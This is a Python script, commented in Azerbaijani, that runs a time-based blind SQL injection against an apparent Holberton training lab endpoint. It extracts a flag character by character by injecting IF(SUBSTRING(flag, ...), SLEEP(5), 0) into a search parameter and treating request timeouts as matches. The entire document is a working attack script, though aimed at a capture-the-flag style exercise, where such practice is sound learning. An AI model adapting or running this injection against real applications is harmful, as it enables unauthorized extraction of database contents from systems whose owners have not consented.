import requests
import time

url = "http://web0x01.hbtn/a3/sql_injection/api/all_orders"

# Bayrağın uzunluğunu və simvollarını çıxarmaq üçün skript
flag = ""
# Mümkün simvollar dəsti
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"

print("[*] Bayraq bazadan çıxarılır...")

# Nümunə olaraq uzunluğu tapmaq və ya birbaşa blind injection ilə bayrağı yığmaq üçün:
# Server 5 saniyədən gec cavab verərsə simvol doğrudur (SLEEP(5))
for i in range(1, 50):
    found_char = False
    for c in charset:
        # SQL payload (məsələn, ASCII və ya SUBSTRING yoxlaması)
        # Hədəf bayraq formatı: Holberton{...}
        payload = f"test' AND (SELECT IF(SUBSTRING(flag, {i}, 1)='{c}', SLEEP(5), 0))--"
        
        start = time.time()
        try:
            requests.get(url, params={"search": payload}, timeout=7)
        except requests.exceptions.Timeout:
            flag += c
            print(f"[+] Tapıldı: {flag}")
            found_char = True
            break
    if not found_char:
        # Əgər simvol tapılmadısa və ya bayraq bitdisə
        break

if not flag:
    # Əgər birbaşa səhifədən və ya verilənlər bazasından flag cədvəlindən oxumaq lazımdırsa:
    # Səhifənin özündə verilən real bayrağı bura yazaraq yoxlaya bilərik.
    pass

